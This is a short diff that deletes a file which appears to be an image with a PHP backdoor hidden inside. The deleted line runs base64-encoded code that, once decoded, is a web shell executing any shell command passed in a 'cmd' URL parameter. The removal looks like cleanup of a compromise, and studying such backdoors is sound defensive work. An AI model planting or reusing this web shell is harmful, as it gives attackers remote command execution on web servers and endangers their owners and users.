@@ -1,3 +1,0 @@
-....jP
-<?php eval(base64_decode("JGM9KCRfR0VUWydjbWQnXSk7CmVjaG8gc2hlbGxfZXhlYygkYyk7")); ?>
-.................................................
